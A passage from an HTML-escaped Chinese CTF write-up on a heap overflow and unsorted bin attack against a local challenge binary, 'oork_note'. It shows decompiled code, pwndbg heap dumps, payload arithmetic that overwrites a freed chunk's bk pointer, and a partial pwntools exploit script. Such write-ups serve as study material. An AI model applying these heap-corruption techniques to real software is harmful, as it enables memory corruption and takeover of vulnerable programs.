__readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		但是这里有个很明显的问题,就是在编辑操作这里,如果编辑地址存在,可以读入0x4f0大小,&lt;font color=&#34;red&#34;&gt;如果我们申请的chunk大小比这个小,那么就存在了溢&lt;/font&gt;出,如果编辑的地址不存在,会重新进行malloc地址,大小为0x3A0&lt;/p&gt;
&lt;p&gt;​		也就是说,如果我们一开始申请一个小的chunk,它后面接一个0x3A0大小的chunk,然后把0x3A0大小的chunk free掉,然后通过溢出,把这个free掉之后的chunk的值修改成我们想要的(&lt;font color=&#34;red&#34;&gt;把bk改成想修改的地址&lt;/font&gt;),然后再重新编辑一下,重新malloc的时候就会又申请到这个free 的chunk(也就是unsorted bin),然后就会触发漏洞&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *(&amp;amp;ptr + (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v2) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, *(&amp;amp;ptr + (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v2), &lt;span class=&#34;number&#34;&gt;0x4F0&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v0 = v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(&amp;amp;ptr + v0) = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x3A0&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, *(&amp;amp;ptr + (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v2), &lt;span class=&#34;number&#34;&gt;0x3A0&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		&lt;/p&gt;
&lt;h2 id=&#34;构造攻击链&#34;&gt;&lt;a href=&#34;#构造攻击链&#34; class=&#34;headerlink&#34; title=&#34;构造攻击链&#34;&gt;&lt;/a&gt;构造攻击链&lt;/h2&gt;&lt;p&gt;​		释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。&lt;/p&gt;
&lt;p&gt;​		什么是不属于fast bin的呢??&lt;/p&gt;
&lt;p&gt;​		那我们就第一个值随意,第二个值构造小一点,比如0x20,第三个值构造成0x3A0,然后后面随意,然后删除第三个值,修改第二个值,覆盖掉它,然后再edit第三个值,进行重新申请,触发漏洞获取flag.&lt;/p&gt;
&lt;p&gt;​		这里注意之前所说的,我们给的大小,它实际上会+0x90,所以要申请一个0x3A0 - 0x90 &amp;#x3D; 0x310 也就是784大小的值&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x603000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0xb1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x6030b0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0xc1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x603170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x3b1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x603520&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0xb1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		0xc1 193     144 + 32 &amp;#x3D; 176    多了17,  这个多的16字节是prev_size + size + NMP, 那为什么还多了一字节 因为对齐,在64位平台下,chunk大小一定是0x10的整数倍,那为什么都多了1呢?这里其实不是多了1,是显示的问题,size的话,是前5字节,也就是11000也就是16 + 4 &amp;#x3D; 20, 然后最后的1是指的P为1,也就是前一个chunk被使用的意思,0是未被使用&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/bt 0x6030b8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x6030b8:	11000001&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230303143001538.png&#34; alt=&#34;image-20230303143001538&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		0xb1 177     144 + 12 &amp;#x3D; 156    多了21,&lt;/p&gt;
&lt;p&gt;​		0x3b1  945  144 + 784 &amp;#x3D; 928 多了17&lt;/p&gt;
&lt;p&gt;​		payload的构造的话,就是填满第2个chunk,然后溢出,填满prev_size,然后修改size为正确值,然后加上bk(要修改的地址)就可以了&lt;/p&gt;
&lt;p&gt;​		payload &amp;#x3D; (0x90 + 0x20) * b”a” + p64(0) + p64(0x3a0+0x1) + p64(0x6020D4)&lt;/p&gt;
&lt;p&gt;p64是个啥,8byte, 8字节,64位, 指令一行又是多少..有点晕&lt;/p&gt;
&lt;p&gt;p64就是64位机器的编码,把0编码成0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00,占64位,也就是8个字节&lt;/p&gt;
&lt;p&gt;这个64位,32位指的是一次处理数据的宽度,和指令长度以及他们的地址没关系&lt;/p&gt;
&lt;p&gt;指令的话,占多少字节都是可能的&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;───────────────────────────────────[ STACK ]────────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;00:0000│ r13 rsp 0x7fffffffe560 ◂— 0x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;01:0008│         0x7fffffffe568 —▸ 0x7fffffffe7b7 ◂— &amp;#x27;/home/ubuntu/2yue/ezfmt&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;02:0010│         0x7fffffffe570 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;03:0018│         0x7fffffffe578 —▸ 0x7fffffffe7cf ◂— 0x524f4c4f435f534c (&amp;#x27;LS_COLOR&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;─────────────────────────────────[ BACKTRACE ]──────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► f 0         0x4006e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;────────────────────────────────────────────────────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/8bx 0x7fffffffe560&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x7fffffffe560:	0x01	0x00	0x00	0x00	0x00	0x00	0x00	0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/8bx 0x7fffffffe568&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x7fffffffe568:	0xb7	0xe7	0xff	0xff	0xff	0x7f	0x00	0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BE3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BE3                 push    rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BE4                 mov     rbp, rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BE7                 sub     rsp, 10h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BEB                 mov     eax, 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BF0                 call    sub_4008F6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BF5                 mov     edi, offset aWelcomeTo997We ; &amp;quot;Welcome to 997 wellfare! This program r&amp;quot;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BFA                 call    _puts&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400BFF                 mov     [rbp+var_8], 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400C06                 mov     [rbp+var_4], 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400C0D                 jmp     short loc_400C37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400C0F ; ---------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400C0F&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		所以 x&amp;#x2F;20wx 0xxxxxxxxxxxx 显示的一行其实是16字节, 128位, 所以左边的地址加了16,&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/20wx 0x6030b0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x6030b0:	0x00000000	0x00000000	0x000000b1	0x00000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x6030c0:	0x000a3231	0x00000000	0x00000000	0x00000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x6030d0:	0x00000000	0x00000000	0x00000000	0x00000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x6030e0:	0x00000000	0x00000000	0x00000000	0x00000000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def add(length,context):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;note:&amp;quot;&lt;/span&gt;,length)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;record:&amp;quot;&lt;/span&gt;,context)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def delete(num):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;exit&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;delete:&amp;quot;&lt;/span&gt;,num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def edit(num,context):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;exit&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;edit:&amp;quot;&lt;/span&gt;,num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;,context)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./oork_note&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(io,&lt;span class=&#34;string&#34;&gt;&amp;quot;b *0x7ffff7af2031&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;32&amp;quot;&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;32&amp;quot;&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;784&amp;quot;&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;32&amp;quot;&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;32&amp;quot;&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;32&amp;quot;&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;32&amp;quot;&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;note? y/n&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;y&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#payload = (0x90 + 0x20) * b&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt; + p64(0) + p64(0x3a0+0x1) + p64(0x6020D4)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#payload = (0x90 + 0x20) * b&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt; + p64(0) + p64(0x3a0+0x1 + 0x10) +p64(0)+ p64(0x6020D4 - 0x10)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = &lt;span class=&#34;number&#34;&gt;0x06020D4&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;176&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x3a1&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;,b&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(io.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 